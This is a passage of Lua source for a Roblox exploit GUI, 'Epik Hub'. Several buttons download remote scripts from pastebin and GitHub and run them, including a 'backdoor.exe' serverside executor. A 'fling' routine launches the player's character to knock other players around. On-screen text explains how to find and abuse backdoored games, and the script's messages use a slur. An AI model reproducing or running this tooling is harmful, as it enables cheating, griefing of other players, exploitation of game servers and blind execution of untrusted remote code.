					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.05)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.49999997, 1, 0, 0.0194152314, 0, -0.99981153, 0, 1, 0, 0.99981153, 0, 0.0194152314), 0.05)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.05)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.05)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.05)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0, 0, -0.996639967, -0.0819067881, 0, -0.00139390712, 0.0169610307, 0.999855161, -0.0818949267, 0.996495605, -0.017018212), 0.05)
					swait()
				end
			end
		end
	end
end)
UICorner_34.Parent = Kitchengun

Slasher.Name = "Slasher"
Slasher.Parent = FlingScriptsFrame
Slasher.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Slasher.Position = UDim2.new(0.641732335, 0, 0.459440231, 0)
Slasher.Size = UDim2.new(0, 143, 0, 43)
Slasher.Font = Enum.Font.Nunito
Slasher.Text = "Slasher"
Slasher.TextColor3 = Color3.fromRGB(238, 238, 238)
Slasher.TextSize = 32.000
Slasher.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/mPU8ujvn", true))()
end)
UICorner_35.Parent = Slasher

Invis.Name = "Invis"
Invis.Parent = FlingScriptsFrame
Invis.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Invis.Position = UDim2.new(0.34251973, 0, 0.604840815, 0)
Invis.Size = UDim2.new(0, 143, 0, 43)
Invis.Font = Enum.Font.Nunito
Invis.Text = "Invis Fling"
Invis.TextColor3 = Color3.fromRGB(238, 238, 238)
Invis.TextSize = 32.000
Invis.MouseButton1Click:Connect(function()
	spawn(function()
		local message = Instance.new("Message",workspace)
		message.Text = "RETARD DESTROYER IS READY TO ACTIVATE . . . Z TO LAUNCH , X TO RESTART RETARD DESTROYER . "
		wait(4)
		message:Destroy()
	end)








	local mouse = game.Players.LocalPlayer:GetMouse()

	local groot = nil

	mouse.KeyDown:connect(function(k)

		if k == "z" then



			spawn(function()
				local message = Instance.new("Message",workspace)
				message.Text = "RETARD DESTROYER ACTIVATING . . . PLEASE W A I T ! !"
				wait(11)
				message:Destroy()
			end)


			local ch = game.Players.LocalPlayer.Character
			local prt=Instance.new("Model", workspace)
			local z1 =  Instance.new("Part", prt)
			z1.Name="Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2  =Instance.new("Part", prt)
			z2.Name="Head"
			z2.Anchored = true
			z2.CanCollide = false
			local z3 =Instance.new("Humanoid", prt)
			z3.Name="Humanoid"
			z1.Position = Vector3.new(0,9999,0)
			z2.Position = Vector3.new(0,9991,0)
			game.Players.LocalPlayer.Character=prt
			wait(5)
			game.Players.LocalPlayer.Character=ch
			wait(6)


			local plr = game.Players.LocalPlayer
			mouse = plr:GetMouse()

			local Hum = Instance.new("Humanoid")
			Hum.Parent = game.Players.LocalPlayer.Character


			local root =  game.Players.LocalPlayer.Character.HumanoidRootPart


			for i,v in pairs(plr.Character:GetChildren()) do

				if v ~= root and  v.Name ~= "Humanoid" then

					v:Destroy()

				end


			end

			workspace.CurrentCamera.CameraSubject = root

			local se = Instance.new("SelectionBox",root)
			se.Adornee = root


			game:GetService('RunService').Stepped:connect(function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			game:GetService('RunService').RenderStepped:connect(function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)


			power = 999999 -- change this to make it more or less powerful

			power = power*10

			---
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 





			local plr = game.Players.LocalPlayer
			local torso = root
			local flying = true
			local deb = true
			local ctrl = {f = 0, b = 0, l = 0, r = 0}
			local lastctrl = {f = 0, b = 0, l = 0, r = 0}
			local maxspeed = 120
			local speed = 15


			---local bambam = Instance.new("BodyThrust")
			---bambam.Parent = torso
			--bambam.Force = Vector3.new(9999999,0,9999999)
			--bambam.Location = torso.Position


			---
			groot = root

			function Fly()
				local bg = Instance.new("BodyGyro", torso)
				bg.P = 9e4
				bg.maxTorque = Vector3.new(0, 0, 0)
				bg.cframe = torso.CFrame
				local bv = Instance.new("BodyVelocity", torso)
				bv.velocity = Vector3.new(0,0,0)
				bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
				repeat wait()

					if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
						speed = speed+.2
						if speed > maxspeed then
							speed = maxspeed
						end
					elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
						speed = speed-1
						if speed < 0 then
							speed = 0
						end
					end
					if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
					elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					else
						bv.velocity = Vector3.new(0,0.1,0)
					end

				until not flying
				ctrl = {f = 0, b = 0, l = 0, r = 0}
				lastctrl = {f = 0, b = 0, l = 0, r = 0}
				speed = 0
				bg:Destroy()
				bv:Destroy()

			end
			mouse.KeyDown:connect(function(key)
				if key:lower() == "e" then
					if flying then flying = false
					else
						flying = true
						Fly()
					end
				elseif key:lower() == "w" then
					ctrl.f = 1
				elseif key:lower() == "s" then
					ctrl.b = -1
				elseif key:lower() == "a" then
					ctrl.l = -1
				elseif key:lower() == "d" then
					ctrl.r = 1
				end
			end)
			mouse.KeyUp:connect(function(key)
				if key:lower() == "w" then
					ctrl.f = 0
				elseif key:lower() == "s" then
					ctrl.b = 0
				elseif key:lower() == "a" then
					ctrl.l = 0
				elseif key:lower() == "d" then
					ctrl.r = 0
				elseif key:lower() == "r" then

				end
			end)
			Fly()



		elseif k == "x" then


			spawn(function()
				local message = Instance.new("Message",workspace)
				message.Text = "Respawning dont spam"
				wait(1)
				message:Destroy()
			end)

			local saved = groot.Position

			local ch = game.Players.LocalPlayer.Character
			local prt=Instance.new("Model", workspace)
			local z1 =  Instance.new("Part", prt)
			z1.Name="Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2  =Instance.new("Part", prt)
			z2.Name="Head"
			z2.Anchored = true
			z2.CanCollide = false
			local z3 =Instance.new("Humanoid", prt)
			z3.Name="Humanoid"
			z1.Position = Vector3.new(0,9999,0)
			z2.Position = Vector3.new(0,9991,0)
			game.Players.LocalPlayer.Character=prt
			wait(5)
			game.Players.LocalPlayer.Character=ch
			local poop = nil
			repeat wait() poop = game.Players.LocalPlayer.Character:FindFirstChild("Head") until poop ~= nil
			wait(1)
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saved)

		end


	end)
end)
UICorner_36.Parent = Invis

Title_3.Name = "Title"
Title_3.Parent = FlingScriptsFrame
Title_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_3.BackgroundTransparency = 1.000
Title_3.Position = UDim2.new(0.0492125973, 0, 0.00589960162, 0)
Title_3.Size = UDim2.new(0, 444, 0, 54)
Title_3.Font = Enum.Font.Nunito
Title_3.Text = "Fling Scripts"
Title_3.TextColor3 = Color3.fromRGB(238, 238, 238)
Title_3.TextSize = 40.000
Title_3.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)

Description_3.Name = "Description"
Description_3.Parent = FlingScriptsFrame
Description_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description_3.BackgroundTransparency = 1.000
Description_3.Position = UDim2.new(0.0149222538, 0, 0.792476654, 0)
Description_3.Size = UDim2.new(0, 477, 0, 69)
Description_3.Font = Enum.Font.Nunito
Description_3.Text = "Why does this need a description? Oh yeah also some of these scripts require a hat, but may still work without the hat. Regarding the hats, I DO NOT DEAL WITH THAT"
Description_3.TextColor3 = Color3.fromRGB(238, 238, 238)
Description_3.TextSize = 21.000
Description_3.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)
Description_3.TextWrapped = true

ServersideFrame.Name = "ServersideFrame"
ServersideFrame.Parent = Frame
ServersideFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ServersideFrame.BackgroundTransparency = 1.000
ServersideFrame.Position = UDim2.new(0.230303034, 0, 0.165841579, 0)
ServersideFrame.Size = UDim2.new(0, 508, 0, 337)
ServersideFrame.Visible = false

BackdoorSS.Name = "BackdoorSS"
BackdoorSS.Parent = ServersideFrame
BackdoorSS.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
BackdoorSS.Position = UDim2.new(0.0252120867, 0, 0.168639049, 0)
BackdoorSS.Size = UDim2.new(0, 482, 0, 43)
BackdoorSS.Font = Enum.Font.Nunito
BackdoorSS.Text = "backdoor.exe"
BackdoorSS.TextColor3 = Color3.fromRGB(238, 238, 238)
BackdoorSS.TextSize = 35.000
BackdoorSS.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
end)
UICorner_37.Parent = BackdoorSS

Title_4.Name = "Title"
Title_4.Parent = ServersideFrame
Title_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_4.BackgroundTransparency = 1.000
Title_4.Position = UDim2.new(0.0492125973, 0, 0.00293224258, 0)
Title_4.Size = UDim2.new(0, 444, 0, 54)
Title_4.Font = Enum.Font.Nunito
Title_4.Text = "SS Executor"
Title_4.TextColor3 = Color3.fromRGB(238, 238, 238)
Title_4.TextSize = 40.000
Title_4.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)

Description_4.Name = "Description"
Description_4.Parent = ServersideFrame
Description_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description_4.BackgroundTransparency = 1.000
Description_4.Position = UDim2.new(0.0472440943, 0, 0.347493619, 0)
Description_4.Size = UDim2.new(0, 463, 0, 219)
Description_4.Font = Enum.Font.Nunito
Description_4.Text = "Serverside executors are scripts that when executed, scan for a backdoor. When a backdoor is found, the script will grant you an SS executor, allowing you to execute 'require' scripts. Backdoored games are hard to find, but their discord server has a channel dedicated to backdoored games. INVITE - .gg/Zhx5jNeR"
Description_4.TextColor3 = Color3.fromRGB(238, 238, 238)
Description_4.TextSize = 28.000
Description_4.TextStrokeColor3 = Color3.fromRGB(238, 238, 238)
Description_4.TextWrapped = true

IntroFrame.Name = "IntroFrame"
IntroFrame.Parent = Frame
IntroFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
IntroFrame.BackgroundTransparency = 1.000
IntroFrame.Position = UDim2.new(0.230303034, 0, 0.165841579, 0)
IntroFrame.Size = UDim2.new(0, 508, 0, 337)

Agreement.Name = "Agreement"
Agreement.Parent = IntroFrame
Agreement.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Agreement.Position = UDim2.new(0.277757645, 0, 0.821458042, 0)
Agreement.Size = UDim2.new(0, 224, 0, 43)
Agreement.Font = Enum.Font.Nunito
Agreement.Text = "Okay"
Agreement.TextColor3 = Color3.fromRGB(238, 238, 238)
Agreement.TextSize = 45.000
Agreement.TextWrapped = true

UICorner_38.Parent = Agreement

HubTitle_2.Name = "HubTitle"
HubTitle_2.Parent = IntroFrame
HubTitle_2.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
HubTitle_2.BackgroundTransparency = 1.000
HubTitle_2.Position = UDim2.new(0.262356758, 0, 0, 0)
HubTitle_2.Size = UDim2.new(0, 227, 0, 73)
HubTitle_2.Font = Enum.Font.Nunito
HubTitle_2.Text = "Epik Hub"
HubTitle_2.TextColor3 = Color3.fromRGB(91, 144, 180)
HubTitle_2.TextSize = 60.000
HubTitle_2.TextWrapped = true

Conditions.Name = "Conditions"
Conditions.Parent = IntroFrame
Conditions.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
Conditions.BackgroundTransparency = 1.000
Conditions.Position = UDim2.new(0.0269121788, 0, 0.183976263, 0)
Conditions.Size = UDim2.new(0, 479, 0, 33)
Conditions.Font = Enum.Font.Nunito
Conditions.Text = "By pressing \"Okay\", you agree to these conditions:"
Conditions.TextColor3 = Color3.fromRGB(238, 238, 238)
Conditions.TextSize = 28.000
Conditions.TextWrapped = true

Cond1.Name = "Cond1"
Cond1.Parent = IntroFrame
Cond1.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
Cond1.BackgroundTransparency = 1.000
Cond1.Position = UDim2.new(0.0269121788, 0, 0.281899095, 0)
Cond1.Size = UDim2.new(0, 479, 0, 29)
Cond1.Font = Enum.Font.Nunito
Cond1.Text = "- getting your bobux stolen"
Cond1.TextColor3 = Color3.fromRGB(238, 238, 238)
Cond1.TextSize = 28.000
Cond1.TextWrapped = true

Cond2.Name = "Cond2"
Cond2.Parent = IntroFrame
Cond2.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
Cond2.BackgroundTransparency = 1.000
Cond2.Position = UDim2.new(0.0269121788, 0, 0.367952526, 0)
Cond2.Size = UDim2.new(0, 479, 0, 29)
Cond2.Font = Enum.Font.Nunito
Cond2.Text = "-using your computer to mine bitcoin"
Cond2.TextColor3 = Color3.fromRGB(238, 238, 238)
Cond2.TextSize = 28.000
Cond2.TextWrapped = true

Cond3.Name = "Cond3"
Cond3.Parent = IntroFrame
Cond3.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
Cond3.BackgroundTransparency = 1.000
Cond3.Position = UDim2.new(0.0269121788, 0, 0.454005927, 0)
Cond3.Size = UDim2.new(0, 479, 0, 29)
Cond3.Font = Enum.Font.Nunito
Cond3.Text = "-using your computer to mine ethereum"
Cond3.TextColor3 = Color3.fromRGB(238, 238, 238)
Cond3.TextSize = 28.000
Cond3.TextWrapped = true

Cond4.Name = "Cond4"
Cond4.Parent = IntroFrame
Cond4.BackgroundColor3 = Color3.fromRGB(238, 238, 238)
Cond4.BackgroundTransparency = 1.000
Cond4.Position = UDim2.new(0.0269121788, 0, 0.540059328, 0)
Cond4.Size = UDim2.new(0, 479, 0, 29)
Cond4.Font = Enum.Font.Nunito
Cond4.Text = "-yeah"
Cond4.TextColor3 = Color3.fromRGB(238, 238, 238)
Cond4.TextSize = 28.000
Cond4.TextWrapped = true

-- Scripts:

local function XYUMN_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (20); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(XYUMN_fake_script)()
local function KAKKB_fake_script() -- ScriptHubs.LocalScript 
	local script = Instance.new('LocalScript', ScriptHubs)

	script.Parent.Parent.ScriptHubs.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.ScriptHubsFrame.Visible = true
		script.Parent.Parent.Parent.GameHubsFrame.Visible = false
		script.Parent.Parent.Parent.FlingScriptsFrame.Visible = false
		script.Parent.Parent.Parent.ServersideFrame.Visible = false
		script.Parent.Parent.Parent.IntroFrame.Visible = false
	end)
	
end
coroutine.wrap(KAKKB_fake_script)()
local function NKYHFAV_fake_script() -- GameHubs.LocalScript 
	local script = Instance.new('LocalScript', GameHubs)

	script.Parent.Parent.GameHubs.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.GameHubsFrame.Visible = true
		script.Parent.Parent.Parent.ScriptHubsFrame.Visible = false
		script.Parent.Parent.Parent.FlingScriptsFrame.Visible = false
		script.Parent.Parent.Parent.ServersideFrame.Visible = false
		script.Parent.Parent.Parent.IntroFrame.Visible = false
	end)
	
end
coroutine.wrap(NKYHFAV_fake_script)()
local function TDXAC_fake_script() -- FlingScripts.LocalScript 
	local script = Instance.new('LocalScript', FlingScripts)

	script.Parent.Parent.FlingScripts.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.FlingScriptsFrame.Visible = true
		script.Parent.Parent.Parent.GameHubsFrame.Visible = false
		script.Parent.Parent.Parent.ScriptHubsFrame.Visible = false
		script.Parent.Parent.Parent.ServersideFrame.Visible = false
		script.Parent.Parent.Parent.IntroFrame.Visible = false
	end)
	
end
coroutine.wrap(TDXAC_fake_script)()
local function NEYSRJK_fake_script() -- Serverside.LocalScript 
	local script = Instance.new('LocalScript', Serverside)

	script.Parent.Parent.Serverside.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.ServersideFrame.Visible = true
		script.Parent.Parent.Parent.GameHubsFrame.Visible = false
		script.Parent.Parent.Parent.ScriptHubsFrame.Visible = false
		script.Parent.Parent.Parent.FlingScriptsFrame.Visible = false
		script.Parent.Parent.Parent.IntroFrame.Visible = false
	end)
	
end
coroutine.wrap(NEYSRJK_fake_script)()
local function NFXHMUE_fake_script() -- IntroFrame.LocalScript 
	local script = Instance.new('LocalScript', IntroFrame)

	
end
coroutine.wrap(NFXHMUE_fake_script)()
local function RMKPR_fake_script() -- Agreement.LocalScript 
	local script = Instance.new('LocalScript', Agreement)

	script.Parent.Parent.Agreement.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.IntroFrame.Visible = false
	end)
	
end
coroutine.wrap(RMKPR_fake_script)()
